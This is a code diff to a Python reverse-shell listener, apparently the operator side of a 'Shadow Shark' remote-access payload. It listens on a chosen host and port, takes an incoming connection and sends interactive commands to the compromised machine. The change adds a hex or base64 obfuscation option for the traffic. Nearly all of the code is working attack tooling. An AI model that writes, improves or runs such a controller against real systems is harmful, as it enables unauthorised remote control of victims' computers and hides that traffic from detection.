@@ -18,27 +18,39 @@ used to interact with Shadow Shark payloads. Created by Mr. Shark Spam Bot.''')
                         help='Your IP address.')
     parser.add_argument('--lp', '--lport', dest='lport', required=True, type=int,
                         help='The port to listen for connections on.')
+    parser.add_argument('--encryption', '-e', dest='encryption', required=True,
+                        type=str, help='The encryption used for sent and recieved data.')
     options = parser.parse_args()
     lhost = options.lhost
     lport = options.lport
+    encryption = options.encryption
     try:
         socket.inet_aton(lhost)
     except socket.error:
         parser.error('Invalid option specified for lhost.')
-    return [lhost, lport]
+    if encryption not in ['hex', 'base64']:
+        parser.error('Only hex and base64 encryptions are supported.')
+    return [lhost, lport, encryption]
 
-def hex_handler(text, encode=False, decode=False):
-    '''Encode or decode text using hex.'''
+def encryption_handler(text, encode=False, decode=False):
+    '''Encode or decode text using hex or base64.'''
+    encryption = arguments[2]
     if encode is True:
         new_text = text.encode()
-        new_text = codecs.encode(new_text, encoding='hex')
+        if encryption == 'hex':
+            new_text = codecs.encode(new_text, encoding='hex')
+        if encryption == 'base64':
+            new_text = codecs.encode(new_text, encoding='base64')
         new_text = new_text.decode()
         new_text = json.dumps(new_text)
         new_text = new_text.encode()
     if decode is True:
         new_text = json.loads(text)
         new_text = new_text.encode()
-        new_text = codecs.decode(new_text, encoding='hex')
+        if encryption == 'hex':
+            new_text = codecs.decode(new_text, encoding='hex')
+        if encryption == 'base64':
+            new_text = codecs.decode(new_text, encoding='base64')
         new_text = new_text.decode()
     return new_text
 
@@ -46,7 +58,6 @@ def listen():
     '''Accept the first incoming TCP connection.'''
     try:
         rev_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        arguments = get_arguments()
         lhost = arguments[0]
         lport = arguments[1]
         try:
@@ -75,18 +86,18 @@ def main():
 
         try:
             while True:
-                connection.send(hex_handler('directory', encode=True))
+                connection.send(encryption_handler('directory', encode=True))
                 directory = connection.recv(1024)
-                directory = hex_handler(directory, decode=True)
+                directory = encryption_handler(directory, decode=True)
                 command = input(f'{directory} ')
                 if command.lower().strip() == 'exit':
-                    connection.send(hex_handler('exit', encode=True))
+                    connection.send(encryption_handler('exit', encode=True))
                     connection.close()
                     rev_socket.close()
                     break
                 if not command.strip():
                     continue
-                connection.send(hex_handler(command, encode=True))
+                connection.send(encryption_handler(command, encode=True))
                 recv = b''
                 while True:
                     try:
@@ -98,7 +109,7 @@ def main():
                     except ValueError:
                         continue
                 try:
-                    recv = hex_handler(recv, decode=True)
+                    recv = encryption_handler(recv, decode=True)
                 except json.decoder.JSONDecodeError:
                     continue
                 if recv.strip():
@@ -112,7 +123,7 @@ def main():
     except KeyboardInterrupt:
         print('\n[+] Ctrl + c detected.')
         print('[-] Terminating program.')
-        connection.send(hex_handler('exit', encode=True))
+        connection.send(encryption_handler('exit', encode=True))
         connection.close()
         rev_socket.close()
         sys.exit()
@@ -133,13 +144,14 @@ if __name__ == '__main__':
 \t  sdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMd/`
 \t   ``:shNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNy/.
 \t       ``./ohdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNdhhdmNMMMMMMNd+.
-\t             ``.-:/+osyhdmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNNmdhs+-`` ````.:+yhmNMMNh+.
-\t                       ```.-:/+syyyhhdMMMMMMMMddddddddddddhysMMMM-.`....``               ```.-/oys:
-\t                                     `mMMMMMMM`````````````  :hNM+
-\t                                      -mMMMMMM.                .+s.
-\t                                       .yMMMMMh`
+\t             ``.-:/+osyhdmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNdhs+-`` ````.:+yhmNMMNh+.
+\t                       ```.-:/+syyyhhdMMMMMMMMddddddddddddddNMMMMdo/:...``               ```.-/oys:
+\t                                     `mMMMMMMM``````````````.sNMMh
+\t                                      -mMMMMMM.               .smMy`
+\t                                       .yMMMMMh`                `:ys.
 \t                                         :yNMMMh.
 \t                                           .odNMm:
 \t                                             `-/sh:
     ''')
+    arguments = get_arguments()
     main()
